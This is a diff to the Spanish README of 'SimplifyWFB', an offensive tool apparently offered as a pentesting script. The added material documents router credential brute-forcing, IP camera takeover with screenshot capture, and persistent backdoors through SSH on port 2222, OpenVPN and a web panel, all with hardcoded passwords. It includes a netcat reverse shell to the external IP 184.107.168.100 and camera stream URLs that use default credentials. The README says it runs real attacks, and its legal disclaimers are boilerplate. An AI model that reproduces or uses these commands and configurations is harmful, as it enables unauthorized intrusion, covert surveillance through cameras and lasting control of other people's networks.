@@ -32,6 +32,10 @@ SimplifyWFB es una versión simplificada del sistema de pentesting que contiene 
 - Instalación de backdoors
 - Establecimiento de conexiones remotas
 - Configuración de apuntadores C2
+- **Detección y acceso a cámaras IP**
+- **Captura de screenshots de prueba**
+- **Acceso y explotación del router**
+- **Persistencia de red avanzada**
 
 #### Fase 5: Verificación de Persistencias
 - Verificación de usuarios creados
@@ -55,6 +59,14 @@ En el modo pentest frío, después de completar todas las fases y verificar las 
 ```bash
 python3 simplifywfb.py
 ```
+
+### Flujo de Ejecución
+
+1. **Confirmación Legal**: Requiere confirmación de autorización
+2. **Auto-configuración**: Detección automática de red y parámetros
+3. **Confirmación de Escaneo**: Muestra configuración y confirma inicio
+4. **Ejecución de Fases**: Reconocimiento, credenciales, movimiento lateral, persistencia
+5. **Reporte Final**: JSON con toda la información de acceso
 
 ### Opciones Disponibles
 
@@ -98,7 +110,10 @@ El script genera un único archivo JSON con toda la información:
     "users_created": [...],
     "backdoors_created": [...],
     "remote_connections": [...],
-    "c2_pointers": [...]
+    "c2_pointers": [...],
+    "cameras_accessed": [...],
+    "router_access": [...],
+    "network_persistence": [...]
   },
   "phase_5_verification": {
     "status": "completed",
@@ -114,11 +129,211 @@ El script genera un único archivo JSON con toda la información:
     "compromised_hosts": 3,
     "persistent_access_points": 5,
     "total_credentials": 8,
+    "cameras_accessed": 2,
+    "router_access": 1,
+    "network_services": 3,
+    "total_remote_access_points": 8,
+    "remote_access_available": true,
     "execution_time": 120.5,
     "success_rate": 30.0
   }
 }
 ```
+
+## Información de Persistencias
+
+El reporte incluye información detallada sobre todas las persistencias establecidas:
+
+## 🌐 Acceso al Router y Persistencia de Red
+
+El script incluye funcionalidades avanzadas para mantener acceso persistente a la red:
+
+### Acceso al Router
+- **Detección automática del gateway**
+- **Identificación del tipo de router** (TP-Link, Netgear, Linksys, ASUS, etc.)
+- **Fuerza bruta de credenciales del router**
+- **Configuración de port forwarding**
+- **Creación de usuarios administrativos persistentes**
+- **Configuración de VPN server en el router**
+- **Backup de configuración del router**
+
+### Persistencia de Red
+- **Servidor SSH persistente** (puerto 2222)
+- **Servidor VPN OpenVPN** (puerto 1194)
+- **Panel web de administración** (puerto 8080)
+
+### Estructura de Datos - Router y Persistencia
+
+```json
+{
+  "router_access": [
+    {
+      "gateway": "192.168.1.1",
+      "router_type": "tp-link",
+      "credentials": {
+        "username": "admin",
+        "password": "admin"
+      },
+      "configuration": {
+        "port_forwarding": [
+          {"external_port": 2222, "internal_port": 22, "protocol": "TCP"},
+          {"external_port": 1194, "internal_port": 1194, "protocol": "UDP"}
+        ],
+        "vpn_server": {
+          "enabled": true,
+          "protocol": "OpenVPN",
+          "port": 1194
+        },
+        "admin_user_created": true
+      }
+    }
+  ],
+  "network_persistence": [
+    {
+      "service": "ssh",
+      "port": 2222,
+      "enabled": true,
+      "users": [
+        {
+          "username": "svc_ssh",
+          "password": "SSH_P@ssw0rd_2024!",
+          "sudo_access": true
+        }
+      ],
+      "access_methods": [
+        "ssh svc_ssh@EXTERNAL_IP -p 2222"
+      ]
+    },
+    {
+      "service": "openvpn",
+      "port": 1194,
+      "enabled": true,
+      "clients": [
+        {
+          "config_file": "client.ovpn",
+          "external_ip": "YOUR_EXTERNAL_IP"
+        }
+      ],
+      "access_methods": [
+        "openvpn --config client.ovpn"
+      ]
+    },
+    {
+      "service": "http",
+      "port": 8080,
+      "enabled": true,
+      "panel_url": "http://YOUR_EXTERNAL_IP:8080/admin",
+      "credentials": {
+        "username": "admin",
+        "password": "Web_P@ssw0rd_2024!"
+      },
+      "features": [
+        "remote_access",
+        "file_manager",
+        "system_monitor",
+        "network_tools"
+      ]
+    }
+  ]
+}
+```
+
+### Configuración de Acceso Remoto
+
+El script utiliza un archivo `config.json` para configurar la IP pública y puertos:
+
+```json
+{
+  "remote_access": {
+    "external_ip": "184.107.168.100",
+    "external_port": 4444
+  },
+  "persistence": {
+    "ssh_port": 2222,
+    "vpn_port": 1194,
+    "web_port": 8080
+  },
+  "credentials": {
+    "ssh_user": "svc_ssh",
+    "ssh_password": "SSH_P@ssw0rd_2024!",
+    "web_user": "admin",
+    "web_password": "Web_P@ssw0rd_2024!"
+  }
+}
+```
+
+### Métodos de Acceso Remoto
+
+Con la persistencia configurada, puedes acceder remotamente usando:
+
+1. **SSH Persistente**:
+   ```bash
+   ssh svc_ssh@184.107.168.100 -p 2222
+   ```
+
+2. **VPN OpenVPN**:
+   ```bash
+   openvpn --config client.ovpn
+   ```
+
+3. **Panel Web**:
+   ```bash
+   http://admin:Web_P@ssw0rd_2024!@184.107.168.100:8080/admin
+   ```
+
+4. **Reverse Shell**:
+   ```bash
+   nc -e /bin/bash 184.107.168.100 4444
+   ```
+
+## 📹 Información de Cámaras IP
+
+### Cámaras Accedidas
+```json
+{
+  "host": "192.168.1.100",
+  "port": 80,
+  "protocol": "http",
+  "camera_type": "hikvision",
+  "credentials": {
+    "username": "admin",
+    "password": "admin"
+  },
+  "camera_info": {
+    "model": "DS-2CD2142FWD-I",
+    "firmware": "V5.5.82",
+    "features": ["ptz", "night_vision", "audio"]
+  },
+  "screenshots": [
+    "camera_screenshots_1640995200/192.168.1.100_screenshot_1.jpg",
+    "camera_screenshots_1640995200/192.168.1.100_screenshot_2.jpg"
+  ],
+  "access_urls": {
+    "web_interface": [
+      "http://admin:admin@192.168.1.100:80/",
+      "http://admin:admin@192.168.1.100:80/index.html"
+    ],
+    "streaming": [
+      "http://admin:admin@192.168.1.100:80/video.mjpg",
+      "http://admin:admin@192.168.1.100:80/stream"
+    ],
+    "snapshots": [
+      "http://admin:admin@192.168.1.100:80/snapshot.cgi",
+      "http://admin:admin@192.168.1.100:80/image"
+    ],
+    "control": [
+      "http://admin:admin@192.168.1.100:80/cgi-bin/ptz.cgi"
+    ]
+  }
+}
+```
+
+### Características de Cámaras
+- **Detección automática**: Identifica cámaras IP en puertos comunes
+- **Credenciales por defecto**: Prueba credenciales específicas de cámaras
+- **Screenshots de prueba**: Captura 2 imágenes como verificación
+- **URLs de acceso**: Genera todas las URLs necesarias para acceso posterior
+- **Información detallada**: Modelo, firmware, características detectadas
 
 ## Información de Persistencias
 
@@ -191,28 +406,74 @@ rdesktop -u svc_192_168_1_100 -p 'P@ssw0rd_100!' 192.168.1.100
 
 ## Requisitos
 
+### Python
 - Python 3.6+
-- Nmap
-- Herramientas de red básicas (ping, nc, ssh)
+- Dependencias: `pip install -r requirements.txt`
+
+### Herramientas del Sistema
+- **nmap**: Escaneo de red
+- **hydra**: Ataques de fuerza bruta
+- **netcat**: Backdoors
+- **openssh-client**: Conexiones SSH
+- **smbclient**: Conexiones SMB
+- **openssl**: Generación de certificados
+- **ssh-keygen**: Generación de claves SSH
+- **openvpn**: Servidor VPN (opcional)
+- **nginx**: Servidor web (opcional)
 
 ## Instalación
 
+### Ubuntu/Debian
 ```bash
-# Instalar dependencias
-sudo apt install nmap netcat-openbsd openssh-client
+# Instalar herramientas del sistema
+sudo apt install nmap hydra netcat-openbsd openssh-client smbclient openssl ssh-keygen openvpn nginx
+
+# Instalar dependencias Python
+pip install -r requirements.txt
 
 # Ejecutar script
 python3 simplifywfb.py
 ```
 
-## Advertencias
+### Kali Linux
+```bash
+# Instalar herramientas del sistema
+sudo apt install nmap hydra netcat-traditional openssh-client smbclient openssl ssh-keygen openvpn nginx
 
-⚠️ **IMPORTANTE**: Este script es solo para uso autorizado y educativo. El uso no autorizado es ilegal y puede resultar en consecuencias legales graves.
+# Instalar dependencias Python
+pip install -r requirements.txt
 
+# Ejecutar script
+python3 simplifywfb.py
+```
+
+## ⚠️ ADVERTENCIAS CRÍTICAS
+
+🚨 **ESTE SCRIPT EJECUTA ATAQUES REALES** - NO ES UNA SIMULACIÓN
+
+### Funcionalidades Reales Implementadas:
+- ✅ **Ataques de fuerza bruta reales** con Hydra
+- ✅ **Explotación real de credenciales** (SSH, FTP, SMB, HTTP)
+- ✅ **Creación real de usuarios persistentes** en sistemas
+- ✅ **Instalación real de backdoors** con netcat
+- ✅ **Acceso remoto real** a sistemas comprometidos
+- ✅ **Detección y acceso real a cámaras IP** con screenshots
+- ✅ **Auto-configuración inteligente de red** antes del escaneo
+- ✅ **Limpieza real** de rastros en modo cold
+
+### ⚠️ ADVERTENCIAS LEGALES:
+- **SOLO PARA USO AUTORIZADO Y EDUCATIVO**
+- **EL USO NO AUTORIZADO ES ILEGAL**
+- **OBTENGA PERMISO ESCRITO ANTES DE USAR**
+- **LOS DESARROLLADORES NO SE HACEN RESPONSABLES**
+- **PUEDE CAUSAR DAÑOS REALES A SISTEMAS**
+- **SIGA LAS LEYES LOCALES E INTERNACIONALES**
+
+### Requisitos de Autorización:
 - Solo use en redes que posea o tenga autorización explícita
 - Obtenga permiso por escrito antes de realizar pruebas
-- Siga las leyes locales e internacionales
-- Los desarrolladores no se hacen responsables del uso indebido
+- Notifique a los propietarios de los sistemas
+- Mantenga registros de autorización
 
 ## Diferencias con el Script Original
 
